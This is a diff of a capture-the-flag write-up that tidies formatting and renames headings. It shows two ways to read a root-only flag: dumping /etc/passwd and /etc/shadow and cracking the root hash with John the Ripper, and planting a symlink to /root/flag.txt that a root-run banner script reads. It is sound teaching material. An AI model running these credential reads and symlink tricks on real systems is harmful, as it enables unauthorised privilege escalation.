@@ -55,9 +55,11 @@ drwxr-xr-x 1 root root   29 Apr 17 10:17 ..
 -rw-r--r-- 1 root root  148 Aug 17  2015 .profile
 
 -rwx------ 1 root root   46 Mar  9 16:39 flag.txt
+
 -rw-r--r-- 1 root root 1317 Feb  7 17:25 script.py
+
 player@challenge:/root$  
-____________________________________________________________________________________**
+____________________________________________________________________________________
 
 As we can see, it you need root Privileges to read the file . 
 As I said there are two hint above , I solved it in two ways. 
@@ -65,14 +67,14 @@ As I said there are two hint above , I solved it in two ways.
 1. Crack the password of root  and enter as root to read the contents of the file 
 2. use the Hint of symblink and following along the way to solve it. 
 
-## Firstly am going to crack the password of root (First way)
+## Method-1 : crack the hash 
 
 read users ( cat /etc/passwd)  and copy the root username and save it into a text file. 
 ______________________________________________________________________________
 player@challenge:/root$ cat /etc/passwd
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
-_______________________________________________________________________________**
+_______________________________________________________________________________
 
 Similary read the hash of passwords stored in /ect/shadow
 player@challenge:~$ cat /etc/shadow
@@ -107,19 +109,18 @@ Proceeding with wordlist:/usr/share/john/password.lst
 1g 0:00:00:01 DONE 2/3 (2024-04-16 21:07) 0.6211g/s 598.7p/s 598.7c/s 598.7C/s 123456..john
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
-__________________________________________________________________________________________**
+__________________________________________________________________________________________
 
 Oh , you did it buddy. "iloveyou" is the password of root. Switch to root and read the contents of the file. 
 
-# let's go for another way (second approach to solve it- symlink)
-
+# Mathod-2 : Symlink Attack
 
 As we saw that you'll need to have root privileges to read the content and we cracked the hash and  entered as root. 
 But this time, we're gonna use the **First Hint-Symlink**
 
 See the following, we can find script.py let also read what this says
 
-**player@challenge:/root$ ls -la
+player@challenge:/root$ ls -la
 ls -la
 total 16
 drwxr-xr-x 1 root root    6 Mar  9 16:39 .
@@ -128,10 +129,8 @@ drwxr-xr-x 1 root root   41 May 16 07:36 ..
 -rw-r--r-- 1 root root  148 Aug 17  2015 .profile
 -rwx------ 1 root root   46 Mar  9 16:39 flag.txt
 -rw-r--r-- 1 root root 1317 Feb  7 17:25 script.py
-player@challenge:/root$ cat script.py**
 
-__________________________________________________
-**player@challenge:/root$ cat script.py
+player@challenge:/root$ cat script.py
 cat script.py
 
 import os
@@ -171,7 +170,6 @@ try:
 
 except:
     KeyboardInterrupt**
-______________________________________________________________________
 
 **Note: We can see that everytime we connect back to server, it loads /home/player/banner**
 
@@ -180,23 +178,24 @@ ______________________________________________________________________
 ## **Symlinks, or symbolic links, are a type of file system object that acts as a reference to another file or directory**
 
 **creating a symlink like creating refrence not actual hard link , we'll create symbolik link for /root/flag.txt in the home directory of user.**
+
 **So, when we connect back to sever it will load the banner which will be referrencing the /root/flag.txt and flag will be loaded.**
 
 Let's first move or rename the banner in home directory of user
 
-**player@challenge:~$ mv banner hint   
+player@challenge:~$ mv banner hint   
 mv banner hint
 player@challenge:~$ ls
 ls
-hint  text**
+hint  text
 
 Now, let make symlink of flag using following command : 
 
-**player@challenge:~$ ln -s /root/flag.txt banner
+player@challenge:~$ ln -s /root/flag.txt banner
 ln -s /root/flag.txt banner
 player@challenge:~$ ls
 ls
-banner  hint  text**
+banner  hint  text
 
 We have made it, just exit and connect back to server, it will load the banner , which referrencing flag and you'll have flag.
 
